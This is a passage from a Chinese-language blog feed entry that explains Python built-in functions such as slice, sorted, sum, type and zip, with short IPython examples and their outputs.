class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">160</span>]: set(a)</span><br><span class="line">Out[<span class="hljs-number">160</span>]: &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;</span><br></pre></td></tr></table></figure><p>55 class slice(stop)</p><p>class slice(start, stop[, step])</p><p>返回一个表示由 range(start, stop, step) 所指定索引集的 slice对象</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">170</span>]: a = [<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">171</span>]: a[slice(<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>)] <span class="hljs-comment">#等价于a[0:5:2]</span></span><br><span class="line">Out[<span class="hljs-number">171</span>]: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>]</span><br></pre></td></tr></table></figure><p>56 sorted(iterable, *, key=None, reverse=False)</p><p>排序：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">174</span>]: a = [<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">175</span>]: sorted(a,reverse=<span class="hljs-literal">True</span>)</span><br><span class="line">Out[<span class="hljs-number">175</span>]: [<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">178</span>]: a = [&#123;<span class="hljs-string">'name'</span>:<span class="hljs-string">'xiaoming'</span>,<span class="hljs-string">'age'</span>:<span class="hljs-number">18</span>,<span class="hljs-string">'gender'</span>:<span class="hljs-string">'male'</span>&#125;,&#123;<span class="hljs-string">'name'</span>:<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">     ...: xiaohong'</span>,<span class="hljs-string">'age'</span>:<span class="hljs-number">20</span>,<span class="hljs-string">'gender'</span>:<span class="hljs-string">'female'</span>&#125;]</span><br><span class="line">In [<span class="hljs-number">180</span>]: sorted(a,key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">'age'</span>],reverse=<span class="hljs-literal">False</span>)</span><br><span class="line">Out[<span class="hljs-number">180</span>]:</span><br><span class="line">[&#123;<span class="hljs-string">'name'</span>: <span class="hljs-string">'xiaoming'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">18</span>, <span class="hljs-string">'gender'</span>: <span class="hljs-string">'male'</span>&#125;,</span><br><span class="line"> &#123;<span class="hljs-string">'name'</span>: <span class="hljs-string">'xiaohong'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">20</span>, <span class="hljs-string">'gender'</span>: <span class="hljs-string">'female'</span>&#125;]</span><br></pre></td></tr></table></figure><p>57 @staticmethod</p><p>将方法转换为静态方法，不做解释</p><p>58 class str(object=’’)</p><p>返回一个 str版本的 object，str 是内置字符串 class</p><p>59 sum(iterable, /, start=0)</p><p>求和：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">181</span>]: a = [<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">182</span>]: sum(a)</span><br><span class="line">Out[<span class="hljs-number">182</span>]: <span class="hljs-number">11</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">185</span>]: sum(a,<span class="hljs-number">10</span>) <span class="hljs-comment">#求和的初始值为10</span></span><br><span class="line">Out[<span class="hljs-number">185</span>]: <span class="hljs-number">21</span></span><br></pre></td></tr></table></figure><p>60 super([type[, object-or-type]])</p><p>返回一个代理对象，它会将方法调用委托给 type 的父类或兄弟类</p><p>61 tuple([iterable])</p><p>虽然被称为函数，但 tuple 实际上是一个不可变的序列类型</p><p>62 class type(object)</p><p>class type(name, bases, dict)</p><p>传入一个参数时，返回 object 的类型：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">186</span>]: type(xiaoming)</span><br><span class="line">Out[<span class="hljs-number">186</span>]: __main__.Student</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">187</span>]: type(tuple())</span><br><span class="line">Out[<span class="hljs-number">187</span>]: tuple</span><br></pre></td></tr></table></figure><p>63 zip(*iterables)</p><p>创建一个聚合了来自每个可迭代对象中的元素的迭代器：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">188</span>]: x = [<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>]</span><br><span class="line">In [<span class="hljs-number">189</span>]: y = [<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]</span><br><span class="line">In [<span class="hljs-number">190</span>]: list(zip(y,x))</span><br><span class="line">Out[<span class="hljs-number">190</span>]: [(<span class="hljs-number">4</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">6</span>, <span class="hljs-number">1</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">191</span>]: a = range(<span class="hljs-number">5</span>)</span><br><span class="line">In [<span class="hljs-number">192</span>]: b = list(<span class="hljs-string">'abcde'</span>)</span><br><span class="line">In [<span class="hljs-number">193</span>]: b</span><br><span class="line">Out[<span class="hljs-number">193</span>]: [<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>]</span><br><span class="line">In [<span class="hljs-number">194</span>]: [str(y) + str(x) <span class="hljs-keyword">for</span> x,y <span class="hljs-keyword">in</span> zip(a,b)]</span><br><span class="line">Out[<span class="hljs-number">194</span>]: [<span class="hljs-string">'a0'</span>, <span class="hljs-string">'b1'</span>, <span class="hljs-string">'c2'</span>, <span class="hljs-string">'d3'</span>, <span class="hljs-string">'e4'</span>]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;1 abs()&lt;/p&gt;
&lt;p&gt;绝对值或复数的模&lt;/p&gt;
&lt;figure class=&quot;highlight python hljs&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;In [&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;]: abs(&lt;span class=&quot;hljs-number&quot;&gt;-6&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Out[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;]: &lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="内置函数" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/"/>
    
  </entry>
  
</feed>
